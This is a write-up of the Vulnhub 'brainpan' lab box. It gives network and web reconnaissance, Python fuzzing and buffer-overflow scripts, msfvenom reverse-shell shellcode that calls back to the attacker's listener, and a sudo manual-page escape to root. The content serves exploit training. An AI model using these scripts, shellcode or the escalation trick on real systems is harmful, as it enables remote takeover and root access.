---
title: Vulnhub "brainpan" write-up
published: true
---

For anyone who's trying to get some hands-on practice on buffer overflows, without getting too much of a headache,
brainpan is a great box to begin with, as it gives the plain basics of how you should approach buffer overflows.
I suggest trying to solve the box on your own before moving on with the walkthrough, but if you must use it... try not to read the whole thing,
but a bit just to get yourself un-stuck.

First of all, after loading up the brainpan machine, which we'll ignore is an ubuntu machine just for the means of practicing,
we'll run up **fping** to scan our network (VMWare, all machines are bridged).

```
fping -a -g -m -q 111.61.0.0/24

111.61.0.117
111.61.0.150
111.61.0.153
```

Knowing that .153 is my kali machine, and that .150 is my windows machine, I now know that 111.61.0.117 is the brainpan machine.
From here we'll go and scan the box for ports and services using **nmap**.

```
sudo nmap -sV -O -T3 -p- 111.61.0.117

Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-10 11:26 IDT
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 58.55% done; ETC: 11:26 (0:00:03 remaining)
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 82.28% done; ETC: 11:26 (0:00:01 remaining)
Nmap scan report for 111.61.0.117
Host is up (0.0010s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
```

We can see that there's an unknown service under port 9999, which we'll try to fingerprint later on,
because we know for certain that there's a HTTP server running on port 10000.
We'll go and browse to the site behind port 10000 and we'll get:

<img width="352" alt="site" src="https://user-images.githubusercontent.com/47437989/117629758-2a184d80-b183-11eb-83f4-3e93101318ec.png">

Scrolling all the way down, we see that there's no information really given to us.
We fire up **dirb** and try to find directories:

```
dirb http://111.61.0.117:10000

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon May 10 11:32:52 2021
URL_BASE: http://111.61.0.117:10000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://111.61.0.117:10000/ ----
+ http://111.61.0.117:10000/bin (CODE:301|SIZE:0)                                                                                                                                                                                           
+ http://111.61.0.117:10000/index.html (CODE:200|SIZE:215)                                                                                                                                                                                  
                                                                                                                                                                                                                                            
-----------------
END_TIME: Mon May 10 11:33:08 2021
DOWNLOADED: 4612 - FOUND: 2
```

As we can see there's a directory called "bin", when we go to that directory we get the directory listing for /bin, which includes a file named "brainpan.exe".
We download the file for future use.

Next on is to try and see what's behind port 9999, I'll use netcat to try and grab a banner for the service behind the port:

```
nc 111.61.0.1117 9999

_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> 
```

Okay, this is interesting... but I've got no information whatsoever to try and tackle this login service.
Moving on, going back to the brainpan.exe, opening it on the windows machine gives me the same login prompt as in port 9999.
running **strings** on the file, gives us the password:

```
shitstorm
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|
[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              
                          >> 
                          ACCESS DENIED
                          ACCESS GRANTED
```

So "shitsotrm" is the password, but other than saying "ACCESS GRANTED" it does nothing...
from here we can understand that we need to exploit the application(brainpan.exe) behind the port itself to gain access.

Loading up brainpan in **Immunity Debugger**, we'll try to fuzz through brainpan with the following python code:

```python
import socket

buffer=["A"]
counter=100

while len(buffer) <= 30:
    buffer.append("A"*counter)
    counter=counter+200

for string in buffer:
    print("Fuzzing... with %s bytes" % len(string))
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect(('111.61.0.150', 9999))
    s.send((string + '\r\n'))
    s.close()
 ```

this script will flood the running binary on the windows machine until it breaks(if it breaks).

<img width="149" alt="EIP414141" src="https://user-images.githubusercontent.com/47437989/117634745-e7a53f80-b187-11eb-8f6f-310b24d6b68e.png">

As we can see the EIP register is 41414141, which means "AAAA"... this means that we overflowed the binary.
Now our next step is to see how many bytes we fuzzed:

```
Fuzzing... with 1 bytes
Fuzzing... with 100 bytes
Fuzzing... with 300 bytes
Fuzzing... with 500 bytes
Fuzzing... with 700 bytes
Fuzzing... with 900 bytes
Fuzzing... with 1100 bytes
Fuzzing... with 1300 bytes
Fuzzing... with 1500 bytes
```

Now we'll use that to create a pattern to find the exact spot of the crash:

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1500 

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9
```

Now we'll use this pattern in our python script:

```python
import socket

shellcode = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9"
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	connect=s.connect(('111.61.0.150', 9999))
	s.send((shellcode + '\r\n'))
except:
	print("CHECK DEBUGGER!.")
s.close()
```

Running the code give us the following address on the EIP register:

<img width="157" alt="EIP357" src="https://user-images.githubusercontent.com/47437989/117636600-a6ae2a80-b189-11eb-8e43-4f0145592b24.png">

"35724134", We're going to use that address to find the offset:

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1500 -q 35724134                                                                                                                                                

[*] Exact match at offset 524

```

Now we know that the break happens after exactly 524 bytes, the next thing we do is to overwrite the EIP just to make sure that we're exact:

```python

import socket

shellcode = "A"*524 + "B"*2+"A"*2
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	connect=s.connect(('111.61.0.150', 9999))
	s.send((shellcode + '\r\n'))
except:
	print("CHECK DEBUGGER!.")
s.close()
```
We'll send exactly 524 A's, and then 2 A's and 2 B's, to see if the EIP register gets the value of "41414242":

<img width="153" alt="EIP41414242" src="https://user-images.githubusercontent.com/47437989/117637563-95195280-b18a-11eb-92dd-6addf9137146.png">

Which is exactly what we've got, excellent.
Next up is to lookup for bad characters with the following script:

```python
import socket

badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = "A"*524 + "B"*2+"A"*2 + badchars
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	connect=s.connect(('111.61.0.150', 9999))
	s.send((shellcode + '\r\n'))
except:
	print("CHECK DEBUGGER!.")
s.close()
```

We then follow the dump of the ESP register (Stack pointer):

<img width="121" alt="BADCHARS" src="https://user-images.githubusercontent.com/47437989/117638055-225ca700-b18b-11eb-9ea2-c80641f570a4.png">

In the hex dump we see all the characters, which means that the only bad character is the default null byte (\x00).
Next up is to check the modules for DEP/ASLR, I use **mona** in the immunity debugger:

```
!mona modules
```

and we get:

<img width="596" alt="monamodule" src="https://user-images.githubusercontent.com/47437989/117638560-a151df80-b18b-11eb-987c-f208f7985fcb.png">

As we can see, brainpan.exe has no ASLR or DEP, next is to find its jump instruction:
```
!mona find -s "\xff\xe4" -m brainpan.exe
```
<img width="519" alt="JMPESP" src="https://user-images.githubusercontent.com/47437989/117639441-964b7f00-b18c-11eb-99b9-fc268321c494.png">

We'll use this address in our payload later on, first we create the payload:

```
msfvenom -p windows/shell_reverse_tcp LHOST=111.61.0.153 LPORT=4444 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00"

Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
"\xba\x04\x9c\xa6\x80\xdd\xc2\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x50\x12\x03\x50\x12\x83\xec\x60\x44\x75\x10\x70\x0b"
"\x76\xe8\x81\x6c\xfe\x0d\xb0\xac\x64\x46\xe3\x1c\xee\x0a\x08"
"\xd6\xa2\xbe\x9b\x9a\x6a\xb1\x2c\x10\x4d\xfc\xad\x09\xad\x9f"
"\x2d\x50\xe2\x7f\x0f\x9b\xf7\x7e\x48\xc6\xfa\xd2\x01\x8c\xa9"
"\xc2\x26\xd8\x71\x69\x74\xcc\xf1\x8e\xcd\xef\xd0\x01\x45\xb6"
"\xf2\xa0\x8a\xc2\xba\xba\xcf\xef\x75\x31\x3b\x9b\x87\x93\x75"
"\x64\x2b\xda\xb9\x97\x35\x1b\x7d\x48\x40\x55\x7d\xf5\x53\xa2"
"\xff\x21\xd1\x30\xa7\xa2\x41\x9c\x59\x66\x17\x57\x55\xc3\x53"
"\x3f\x7a\xd2\xb0\x34\x86\x5f\x37\x9a\x0e\x1b\x1c\x3e\x4a\xff"
"\x3d\x67\x36\xae\x42\x77\x99\x0f\xe7\xfc\x34\x5b\x9a\x5f\x51"
"\xa8\x97\x5f\xa1\xa6\xa0\x2c\x93\x69\x1b\xba\x9f\xe2\x85\x3d"
"\xdf\xd8\x72\xd1\x1e\xe3\x82\xf8\xe4\xb7\xd2\x92\xcd\xb7\xb8"
"\x62\xf1\x6d\x6e\x32\x5d\xde\xcf\xe2\x1d\x8e\xa7\xe8\x91\xf1"
"\xd8\x13\x78\x9a\x73\xee\xeb\xca\xbe\xf0\x72\x7c\xc3\xf0\x95"
"\x21\x4a\x16\xff\xc9\x1a\x81\x68\x73\x07\x59\x08\x7c\x9d\x24"
"\x0a\xf6\x12\xd9\xc5\xff\x5f\xc9\xb2\x0f\x2a\xb3\x15\x0f\x80"
"\xdb\xfa\x82\x4f\x1b\x74\xbf\xc7\x4c\xd1\x71\x1e\x18\xcf\x28"
"\x88\x3e\x12\xac\xf3\xfa\xc9\x0d\xfd\x03\x9f\x2a\xd9\x13\x59"
"\xb2\x65\x47\x35\xe5\x33\x31\xf3\x5f\xf2\xeb\xad\x0c\x5c\x7b"
"\x2b\x7f\x5f\xfd\x34\xaa\x29\xe1\x85\x03\x6c\x1e\x29\xc4\x78"
"\x67\x57\x74\x86\xb2\xd3\x94\x65\x16\x2e\x3d\x30\xf3\x93\x20"
"\xc3\x2e\xd7\x5c\x40\xda\xa8\x9a\x58\xaf\xad\xe7\xde\x5c\xdc"
"\x78\x8b\x62\x73\x78\x9e";
```

Now we create our final buffer overflow script to gain a remote connection to the target, for now we'll first try and access the windows machine,
just to see that everything works before we move on to the brainpan box.

```python

import socket

buf=("\xba\x04\x9c\xa6\x80\xdd\xc2\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x50\x12\x03\x50\x12\x83\xec\x60\x44\x75\x10\x70\x0b"
"\x76\xe8\x81\x6c\xfe\x0d\xb0\xac\x64\x46\xe3\x1c\xee\x0a\x08"
"\xd6\xa2\xbe\x9b\x9a\x6a\xb1\x2c\x10\x4d\xfc\xad\x09\xad\x9f"
"\x2d\x50\xe2\x7f\x0f\x9b\xf7\x7e\x48\xc6\xfa\xd2\x01\x8c\xa9"
"\xc2\x26\xd8\x71\x69\x74\xcc\xf1\x8e\xcd\xef\xd0\x01\x45\xb6"
"\xf2\xa0\x8a\xc2\xba\xba\xcf\xef\x75\x31\x3b\x9b\x87\x93\x75"
"\x64\x2b\xda\xb9\x97\x35\x1b\x7d\x48\x40\x55\x7d\xf5\x53\xa2"
"\xff\x21\xd1\x30\xa7\xa2\x41\x9c\x59\x66\x17\x57\x55\xc3\x53"
"\x3f\x7a\xd2\xb0\x34\x86\x5f\x37\x9a\x0e\x1b\x1c\x3e\x4a\xff"
"\x3d\x67\x36\xae\x42\x77\x99\x0f\xe7\xfc\x34\x5b\x9a\x5f\x51"
"\xa8\x97\x5f\xa1\xa6\xa0\x2c\x93\x69\x1b\xba\x9f\xe2\x85\x3d"
"\xdf\xd8\x72\xd1\x1e\xe3\x82\xf8\xe4\xb7\xd2\x92\xcd\xb7\xb8"
"\x62\xf1\x6d\x6e\x32\x5d\xde\xcf\xe2\x1d\x8e\xa7\xe8\x91\xf1"
"\xd8\x13\x78\x9a\x73\xee\xeb\xca\xbe\xf0\x72\x7c\xc3\xf0\x95"
"\x21\x4a\x16\xff\xc9\x1a\x81\x68\x73\x07\x59\x08\x7c\x9d\x24"
"\x0a\xf6\x12\xd9\xc5\xff\x5f\xc9\xb2\x0f\x2a\xb3\x15\x0f\x80"
"\xdb\xfa\x82\x4f\x1b\x74\xbf\xc7\x4c\xd1\x71\x1e\x18\xcf\x28"
"\x88\x3e\x12\xac\xf3\xfa\xc9\x0d\xfd\x03\x9f\x2a\xd9\x13\x59"
"\xb2\x65\x47\x35\xe5\x33\x31\xf3\x5f\xf2\xeb\xad\x0c\x5c\x7b"
"\x2b\x7f\x5f\xfd\x34\xaa\x29\xe1\x85\x03\x6c\x1e\x29\xc4\x78"
"\x67\x57\x74\x86\xb2\xd3\x94\x65\x16\x2e\x3d\x30\xf3\x93\x20"
"\xc3\x2e\xd7\x5c\x40\xda\xa8\x9a\x58\xaf\xad\xe7\xde\x5c\xdc"
"\x78\x8b\x62\x73\x78\x9e")

shellcode = "A"*524 + "\xf3\x12\x17\x31" + "\x90"*10 + buf 

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connect=s.connect(('111.61.0.150', 9999))
    s.send((shellcode + '\r\n'))
except:
    print("ERROR!")
s.close()
```

Note that I added some NOPs (\x90) to create some spacing before the shellcode.
Opening a netcat listener on port 4444:

```
nc -lvnp 4444                                                                                                                                                                                                                       
listening on [any] 4444 ...
```
And we run our script.
And we've got a shell on our own machine:
<img width="255" alt="winshell" src="https://user-images.githubusercontent.com/47437989/117640960-4372c700-b18e-11eb-9345-2241fac6f4fb.png">

next up is to create a linux shellcode and use it against the brainpan box.
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=111.61.0.153 LPORT=4444 EXITFUNC=thread -a x86 --platform linux -f c -b "\x00" -e x86/shikata_ga_nai
```

We take the shellcode and replace it in our script, and also replace the IP address to the brainpan box's.
Next we put up a netcat listener again, and run the final script:

we got a shell on the box:

<img width="256" alt="puck" src="https://user-images.githubusercontent.com/47437989/117641932-694c9b80-b18f-11eb-8b3b-b461351c46cc.png">

using python to get an interactive shell:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```
Now on to privilege escalation,
we run sudo -l and we get the following:

```
puck@brainpan:/home/puck$ sudo -l

Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
```

We can run anansi_util as root, now we just need to find a way to escape it as root.
running sudo /home/anansi/bin/anansi_util gives us:

```
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```

we can use the manual action to give a command after it, so let's try to read a manual with it:

```
sudo /home/anansi/bin/anansi_util manual bash
```

it gives us the manual for bash viewed by root, but we need to escape it to stay as root.
easiest way from here will be to use the "!" character, we enter ! and hit enter.

<img width="157" alt="root" src="https://user-images.githubusercontent.com/47437989/117642941-8cc41600-b190-11eb-9d4e-778331443b34.png">

We've got root, and we're done :)
